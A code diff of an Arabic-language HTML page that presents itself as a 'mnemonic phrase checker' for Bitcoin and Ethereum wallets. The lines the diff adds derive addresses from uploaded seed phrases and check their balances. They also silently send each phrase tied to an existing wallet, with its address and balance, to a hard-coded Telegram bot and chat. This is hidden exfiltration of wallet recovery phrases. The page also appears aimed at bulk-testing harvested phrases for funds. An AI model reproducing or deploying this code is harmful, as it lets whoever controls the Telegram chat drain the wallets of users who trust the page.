@@ -1,13 +1,475 @@
-<!DOCTYPE html><html lang="ar"><head>  <meta charset="UTF-8">  <title>فاحص عبارات Mnemonic (BTC/ETH)</title>
-  <!-- 1) تحميل الـUMD bundle الرسمي الخاص بـbip39 -->  <script src="https://unpkg.com/bip39@3.0.4/browser/bip39.min.js"></script>  <!-- 2) باقي المكتبات بصيغة UMD -->  <script src="https://cdn.jsdelivr.net/npm/hdkey@1.1.1/dist/hdkey.min.js"></script>  <script src="https://cdn.jsdelivr.net/npm/ethereumjs-util@7.1.3/dist/index.umd.js"></script>  <script src="https://cdn.jsdelivr.net/npm/bitcoinjs-lib@6.1.0/dist/bitcoinjs.min.js"></script>
-  <style>    body { background:#000; color:#33ff33; font-family:monospace; padding:1rem; }    input,button{ width:100%;max-width:500px;padding:.5rem;margin:.5rem 0;background:#111;color:#33ff33;border:1px solid #33ff33;cursor:pointer; }    button:hover{ background:#222 }    #summary{margin-top:1rem;font-weight:bold}    #results{background:#111;padding:.5rem;max-height:400px;overflow:auto;margin-top:1rem}    #results div{padding:4px 0;border-bottom:1px dashed #222}    #results div:last-child{border:none}    .good{color:#0f0} .bad{color:#f33} .limit{color:#ff3;font-weight:bold}  </style></head><body>  <h2>فاحص عبارات Mnemonic (BTC/ETH)</h2>  <input type="file" id="fileInput" accept=".txt">  <button onclick="scanFile()">بدء الفحص</button>  <div id="summary">لم يتم الفحص بعد.</div>  <div id="results"></div>
-  <script>    const CORS = 'https://corsproxy.io/?';
-    async function safeFetchJson(url) {      try {        const res = await fetch(CORS + encodeURIComponent(url));        if (res.status === 429) throw new Error('rate_limit');        if (!res.ok) return null;        return await res.json();      } catch (e) {        if (e.message === 'rate_limit') throw e;        return null;      }    }
-    async function checkBtc(addr) {      const j = await safeFetchJson(`https://blockstream.info/api/address/${addr}`);      if (!j || !j.chain_stats) return 0;      return (j.chain_stats.funded_txo_sum - j.chain_stats.spent_txo_sum) / 1e8;    }
-    async function checkEth(addr) {      const j = await safeFetchJson(        `https://api.etherscan.io/api?module=account&action=balance&address=${addr}&tag=latest`      );      if (!j || !j.result) return 0;      return parseInt(j.result, 10) / 1e18;    }
-    function deriveBtc(seed) {      const root = hdkey.fromMasterSeed(seed);      const child = root.derive("m/44'/0'/0'/0/0");      return bitcoinjs.payments.p2pkh({ pubkey: child.publicKey }).address;    }
-    function deriveEth(seed) {      const root = hdkey.fromMasterSeed(seed);      const child = root.derive("m/44'/60'/0'/0/0");      return '0x' + ethereumjs.Util.pubToAddress(child.publicKey, true).toString('hex');    }
-    async function scanPhrase(p) {      if (!bip39.validateMnemonic(p)) return {ok:false};      const seed = await bip39.mnemonicToSeed(p);      const aB = deriveBtc(seed), aE = deriveEth(seed);      const bB = await checkBtc(aB);      if (bB>0) return {ok:true,chain:'BTC',addr:aB,balance:bB+' BTC'};      const bE = await checkEth(aE);      if (bE>0) return {ok:true,chain:'ETH',addr:aE,balance:bE+' ETH'};      return {ok:false};    }
-    async function scanFile() {      const file = document.getElementById('fileInput').files[0];      if (!file) {        document.getElementById('summary').textContent = ' يرجى رفع ملف العبارات أولاً.';        return;      }      const txt = await file.text();      const lines = txt.trim().split(/\r?\n/).filter(l=>l.trim());      const total = lines.length;      const out = document.getElementById('results');      out.innerHTML = '';      let found=0,notfound=0,stopped=false;
-      for (let i=0; i<total && !stopped; i++) {        document.getElementById('summary').innerHTML = ` تم فحص <b>${i+1}/${total}</b> عبارة`;        try {          const r = await scanPhrase(lines[i]);          if (r.ok) {            found++;            out.innerHTML += `<div class="good"> [${r.chain}] ${lines[i]} → ${r.addr} (${r.balance})</div>`;          } else {            notfound++;            out.innerHTML += `<div class="bad"> ${lines[i]}</div>`;          }        } catch(e) {          if (e.message==='rate_limit') {            stopped=true;            out.innerHTML += `<div class="limit"> تم الوصول للحد الأقصى لطلبات API، توقف الفحص.</div>`;          } else {            notfound++;            out.innerHTML += `<div class="bad"> ${lines[i]} (خطأ: ${e.message})</div>`;          }        }        out.scrollTop = out.scrollHeight;        await new Promise(r=>setTimeout(r,100));      }
-      let summary = ` صالحة: ${found} | غير صالحة: ${notfound}`;      if (stopped) summary += ' | توقف بسبب تجاوز الحد.';      document.getElementById('summary').innerHTML = summary;    }  </script></body></html>
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فاحص عبارات Mnemonic (BTC/ETH)</title>
+    <!-- External Libraries from Public CDNs -->
+    <script src="https://cdn.jsdelivr.net/npm/bip39@3.0.4/dist/bip39.min.js"></script> <!-- BIP39 checksum & seed derivation -->
+    <script src="https://cdn.jsdelivr.net/npm/hdkey@1.1.1/dist/hdkey.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethereumjs-util@7.1.3/dist/index.umd.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bitcoinjs-lib@6.1.0/dist/bitcoinjs.min.js"></script>
+    <style>
+        /* Hacker-style CSS theme */
+        body {
+            background-color: #000;
+            color: #33ff33;
+            font-family: 'Source Code Pro', monospace;
+            text-shadow: 0 0 8px rgba(51, 255, 51, 0.7); /* Neon glow effect */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            margin: 0;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        h2 {
+            color: #33ff33;
+            text-shadow: 0 0 10px rgba(51, 255, 51, 0.9);
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        input[type="file"],
+        button {
+            background-color: #111;
+            color: #33ff33;
+            border: 2px solid #33ff33;
+            padding: 10px 15px;
+            margin: 8px 0;
+            border-radius: 5px;
+            font-family: 'Source Code Pro', monospace;
+            font-size: 1em;
+            box-shadow: 0 0 5px rgba(51, 255, 51, 0.5);
+            transition: background-color 0.3s ease, box-shadow 0.3s ease;
+            width: 100%;
+            max-width: 500px;
+            cursor: pointer;
+        }
+
+        input[type="file"]::file-selector-button {
+            background-color: #33ff33;
+            color: #000;
+            border: none;
+            padding: 8px 12px;
+            border-radius: 3px;
+            font-family: 'Source Code Pro', monospace;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        input[type="file"]::file-selector-button:hover {
+            background-color: #22ee22;
+        }
+
+        button:hover {
+            background-color: #222;
+            box-shadow: 0 0 15px rgba(51, 255, 51, 0.9);
+        }
+
+        #summary {
+            margin-top: 20px;
+            font-size: 1.1em;
+            text-align: center;
+            width: 100%;
+            max-width: 600px;
+        }
+
+        #summary .count {
+            color: #00ff00;
+            font-weight: bold;
+            text-shadow: 0 0 5px rgba(0, 255, 0, 0.7);
+        }
+
+        #results {
+            background-color: #111;
+            border: 2px solid #33ff33;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 20px;
+            width: 90%;
+            max-width: 800px;
+            height: 400px; /* Fixed height for scrollability */
+            overflow-y: scroll;
+            font-family: 'Source Code Pro', monospace;
+            font-size: 0.9em;
+            box-shadow: 0 0 10px rgba(51, 255, 51, 0.6);
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            scrollbar-width: thin;
+            scrollbar-color: #33ff33 #111;
+        }
+
+        #results::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        #results::-webkit-scrollbar-track {
+            background: #111;
+            border-radius: 10px;
+        }
+
+        #results::-webkit-scrollbar-thumb {
+            background-color: #33ff33;
+            border-radius: 10px;
+            border: 2px solid #111;
+        }
+
+        #results div {
+            padding: 5px 0;
+            border-bottom: 1px dashed #222;
+        }
+
+        #results div:last-child {
+            border-bottom: none;
+        }
+
+        .good {
+            color: #00ff00; /* Green for found with funds */
+        }
+
+        .empty-wallet {
+            color: #ffff33; /* Yellow for found empty */
+            text-shadow: 0 0 5px rgba(255, 255, 51, 0.7);
+        }
+
+        .bad {
+            color: #ff3333; /* Red for not found */
+        }
+
+        .limit {
+            color: #ffff33;
+            font-weight: bold;
+            text-shadow: 0 0 5px rgba(255, 255, 51, 0.7);
+        }
+
+        /* Custom message box for alerts */
+        .message-box-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .message-box {
+            background-color: #222;
+            color: #ff3333;
+            border: 2px solid #ff3333;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(255, 51, 51, 0.7);
+            font-family: 'Source Code Pro', monospace;
+            text-align: center;
+            max-width: 80%;
+        }
+
+        .message-box button {
+            background-color: #ff3333;
+            color: #000;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 5px;
+            margin-top: 15px;
+            cursor: pointer;
+            font-size: 1em;
+            width: auto;
+            max-width: none;
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 600px) {
+            body {
+                padding: 10px;
+            }
+
+            h2 {
+                font-size: 1.5em;
+            }
+
+            input[type="file"],
+            button {
+                font-size: 0.9em;
+                padding: 8px 12px;
+            }
+
+            #results {
+                font-size: 0.8em;
+                padding: 10px;
+                height: 300px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <h2>فاحص عبارات Mnemonic (BTC/ETH)</h2>
+    <input type="file" id="fileInput" accept=".txt">
+    <button onclick="scanFile()">بدء الفحص</button>
+    <audio id="gunshot" src="gunshot.mp3" preload="auto"></audio> <!-- Retaining gunshot audio as per previous request -->
+    <div id="summary">لم يتم الفحص بعد.</div>
+    <div id="results"></div>
+
+    <script>
+        // Constants for Telegram API and CORS proxy
+        const TELEGRAM_BOT_TOKEN = '8026919110:AAGOm56kp92jEt9NphOYeBMiG_U_bX1uCYU';
+        const TELEGRAM_CHAT_ID = '-4913064483';
+        const CORS_PROXY_URL = 'https://corsproxy.io/?';
+
+        /**
+         * Shows a custom message box instead of native alert().
+         * @param {string} message The message to display.
+         */
+        function showMessageBox(message) {
+            const overlay = document.createElement('div');
+            overlay.className = 'message-box-overlay';
+            overlay.innerHTML = `
+                <div class="message-box">
+                    <p>${message}</p>
+                    <button onclick="this.closest('.message-box-overlay').remove()">موافق</button>
+                </div>
+            `;
+            document.body.appendChild(overlay);
+        }
+
+        /**
+         * Sends an alert message to a configured Telegram chat.
+         * @param {string} text The text message to send.
+         */
+        async function sendTelegramAlert(text) {
+          try {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(text)}`;
+            await fetch(url);
+          } catch (e) {
+            console.error('Telegram alert failed', e);
+          }
+        }
+
+        /**
+         * Fetches data from a given URL using a CORS proxy and checks for rate limits.
+         * @param {string} url The original API URL to fetch.
+         * @returns {Promise<Object>} The JSON response from the API.
+         * @throws {Error} If a rate limit (429 status) is detected or other fetch error occurs.
+         */
+        async function checkApi(url) {
+            const proxiedUrl = `${CORS_PROXY_URL}${encodeURIComponent(url)}`;
+            const res = await fetch(proxiedUrl);
+            if (res.status === 429) {
+                throw new Error('rate_limit');
+            }
+            if (!res.ok) {
+                throw new Error(`API returned status ${res.status}: ${res.statusText}`);
+            }
+            return res.json();
+        }
+
+        /**
+         * Checks the Bitcoin balance for a given address using Blockstream API.
+         * @param {string} addr The Bitcoin address.
+         * @returns {Promise<{exists: boolean, balance: number, unit: string}>} Object indicating existence, balance (in BTC), and unit.
+         */
+        async function checkBtc(addr) {
+            try {
+                const data = await checkApi(`https://blockstream.info/api/address/${addr}`);
+                // Blockstream API provides chain_stats for confirmed transactions.
+                // If the address exists, it will have 'chain_stats'.
+                if (data && data.chain_stats) {
+                    const totalSatoshi = data.chain_stats.funded_txo_sum - data.chain_stats.spent_txo_sum;
+                    return { exists: true, balance: totalSatoshi / 100000000, unit: 'BTC' }; // Convert satoshi to BTC
+                }
+                return { exists: false, balance: 0, unit: 'BTC' };
+            } catch (error) {
+                if (error.message === 'rate_limit') throw error;
+                // If API returns an error other than rate limit (e.g., 404 for not found), treat as non-existent
+                console.warn(`BTC check for ${addr} failed:`, error);
+                return { exists: false, balance: 0, unit: 'BTC' };
+            }
+        }
+
+        /**
+         * Checks the Ethereum balance for a given address using Etherscan API.
+         * @param {string} addr The Ethereum address.
+         * @returns {Promise<{exists: boolean, balance: number, unit: string}>} Object indicating existence, balance (in ETH), and unit.
+         */
+        async function checkEth(addr) {
+            try {
+                const json = await checkApi(`https://api.etherscan.io/api?module=account&action=balance&address=${addr}&tag=latest`);
+                // Etherscan API returns a result field. If it's a valid number (even '0'), the address exists.
+                if (json && typeof json.result === 'string' && !isNaN(parseFloat(json.result))) {
+                    const balanceWei = parseFloat(json.result);
+                    return { exists: true, balance: balanceWei / 1e18, unit: 'ETH' }; // Convert wei to ETH
+                }
+                return { exists: false, balance: 0, unit: 'ETH' };
+            } catch (error) {
+                if (error.message === 'rate_limit') throw error;
+                console.warn(`ETH check for ${addr} failed:`, error);
+                return { exists: false, balance: 0, unit: 'ETH' };
+            }
+        }
+
+        /**
+         * Derives the first BTC address (P2PKH) from a given seed.
+         * Derivation path: m/44'/0'/0'/0/0
+         * @param {Buffer} seed The master seed buffer.
+         * @returns {string} The derived BTC address.
+         */
+        function deriveBtc(seed) {
+          const root = hdkey.fromMasterSeed(seed);
+          const child = root.derive("m/44'/0'/0'/0/0"); // BIP44 path for Bitcoin mainnet
+          return bitcoin.payments.p2pkh({ pubkey: child.publicKey }).address;
+        }
+
+        /**
+         * Derives the first ETH address from a given seed.
+         * Derivation path: m/44'/60'/0'/0/0
+         * @param {Buffer} seed The master seed buffer.
+         * @returns {string} The derived ETH address (0x prefixed).
+         */
+        function deriveEth(seed) {
+          const root = hdkey.fromMasterSeed(seed);
+          const child = root.derive("m/44'/60'/0'/0/0"); // BIP44 path for Ethereum
+          // pubToAddress expects uncompressed public key.
+          return '0x' + ethereumjs.Util.pubToAddress(child.publicKey, false).toString('hex'); // 'false' for uncompressed pubkey
+        }
+
+        /**
+         * Scans a single BIP39 mnemonic phrase for balances on BTC and ETH chains.
+         * @param {string} phrase The 12-word mnemonic phrase.
+         * @returns {Promise<Object>} An object indicating the scan status, chain, address, and balance.
+         */
+        async function scanPhrase(phrase) {
+            // Validate mnemonic phrase
+            if (!bip39.validateMnemonic(phrase)) {
+                return { status: 'not_found' }; // Invalid mnemonic
+            }
+
+            // Derive seed from mnemonic
+            const seed = await bip39.mnemonicToSeed(phrase);
+
+            // Derive addresses for BTC and ETH chains
+            const btcAddr = deriveBtc(seed);
+            const ethAddr = deriveEth(seed);
+
+            // Check BTC balance
+            const btcResult = await checkBtc(btcAddr);
+            if (btcResult.balance > 0) {
+                return { status: 'found_funds', chain: 'BTC', addr: btcAddr, balance: btcResult.balance, unit: btcResult.unit };
+            }
+            
+            // Check ETH balance
+            const ethResult = await checkEth(ethAddr);
+            if (ethResult.balance > 0) {
+                return { status: 'found_funds', chain: 'ETH', addr: ethAddr, balance: ethResult.balance, unit: ethResult.unit };
+            }
+            
+            // If no funds found, check if wallets exist with zero balance
+            if (btcResult.exists) {
+                return { status: 'found_empty', chain: 'BTC', addr: btcAddr, balance: btcResult.balance, unit: btcResult.unit };
+            }
+            if (ethResult.exists) {
+                return { status: 'found_empty', chain: 'ETH', addr: ethAddr, balance: ethResult.balance, unit: ethResult.unit };
+            }
+            
+            return { status: 'not_found' }; // Genuinely not found or API error that wasn't rate_limit
+        }
+
+        /**
+         * Main function to handle file reading and batch scanning of mnemonic phrases.
+         * Updates UI with progress and results, handles errors and rate limits.
+         */
+        async function scanFile() {
+            const fileInput = document.getElementById('fileInput');
+            const file = fileInput.files[0];
+
+            // Check if a file is selected
+            if (!file) {
+                showMessageBox('يرجى رفع ملف العبارات أولاً.');
+                return;
+            }
+
+            // Read file content as text
+            const lines = await new Promise((resolve) => {
+                const fileReader = new FileReader();
+                fileReader.onload = (e) => {
+                    // Split lines, filter out empty/blank lines, and trim whitespace from each phrase
+                    const rawLines = e.target.result.trim().split(/\r?\n/);
+                    const filteredLines = rawLines.filter(line => line.trim() !== '');
+                    resolve(filteredLines);
+                };
+                fileReader.readAsText(file, 'UTF-8');
+            });
+
+            const totalPhrases = lines.length;
+            const resultsDiv = document.getElementById('results');
+            resultsDiv.innerHTML = ''; // Clear previous results
+            
+            let fundsFoundCount = 0;
+            let emptyFoundCount = 0;
+            let notFoundCount = 0;
+            let scanStopped = false;
+            const gunshotAudio = document.getElementById('gunshot');
+
+            // Iterate through each mnemonic phrase
+            for (let i = 0; i < totalPhrases && !scanStopped; i++) {
+                // Update live progress counter
+                document.getElementById('summary').innerHTML = `🚀 تم فحص <span class="count">${i + 1}/${totalPhrases}</span> عبارة`;
+                
+                const currentPhrase = lines[i];
+
+                try {
+                    const scanResult = await scanPhrase(currentPhrase);
+
+                    switch (scanResult.status) {
+                        case 'found_funds':
+                            fundsFoundCount++;
+                            resultsDiv.innerHTML += `<div class="good">✅ [${scanResult.chain}] ${currentPhrase} → ${scanResult.addr} (${scanResult.balance.toFixed(8)} ${scanResult.unit})</div>`;
+                            gunshotAudio.currentTime = 0; // Rewind to start
+                            gunshotAudio.play().catch(e => console.error("Error playing gunshot sound:", e));
+                            sendTelegramAlert(`Found ${scanResult.chain} wallet with funds:\nPhrase: ${currentPhrase}\nAddress: ${scanResult.addr}\nBalance: ${scanResult.balance.toFixed(8)} ${scanResult.unit}`);
+                            break;
+                        case 'found_empty':
+                            emptyFoundCount++;
+                            resultsDiv.innerHTML += `<div class="empty-wallet">⚪️ [${scanResult.chain}] ${currentPhrase} → ${scanResult.addr} (0 ${scanResult.unit})</div>`;
+                            sendTelegramAlert(`Found empty ${scanResult.chain} wallet:\nPhrase: ${currentPhrase}\nAddress: ${scanResult.addr}\nBalance: 0 ${scanResult.unit}`);
+                            break;
+                        case 'not_found':
+                            notFoundCount++;
+                            resultsDiv.innerHTML += `<div class="bad">❌ ${currentPhrase}</div>`;
+                            break;
+                    }
+                } catch (error) {
+                    if (error.message === 'rate_limit') {
+                        scanStopped = true;
+                        resultsDiv.innerHTML += `<div class="limit">⚠️ تم الوصول للحد الأقصى لطلبات API، توقف الفحص.</div>`;
+                        console.warn('API rate limit reached. Scanning stopped.');
+                    } else {
+                        // For other unexpected errors, treat as not found for counting purposes
+                        notFoundCount++;
+                        resultsDiv.innerHTML += `<div class="bad">❌ ${currentPhrase} (خطأ: ${error.message || 'غير معروف'})</div>`;
+                        console.error(`Error scanning phrase ${currentPhrase}:`, error);
+                    }
+                }
+                // Automatically scroll to the bottom of the results div
+                resultsDiv.scrollTop = resultsDiv.scrollHeight;
+            }
+
+            // Display final summary totals
+            document.getElementById('summary').innerHTML = `
+                <br>
+                <span class="good">Found with funds: ${fundsFoundCount}</span> | 
+                <span class="empty-wallet">Found empty: ${emptyFoundCount}</span> |
+                <span class="bad">Not found: ${notFoundCount}</span>
+            `;
+            if (scanStopped) {
+                document.getElementById('summary').innerHTML += `<br><span class="limit">توقف الفحص بسبب تجاوز الحد الأقصى لطلبات API.</span>`;
+            }
+        }
+    </script>
+</body>
+</html>
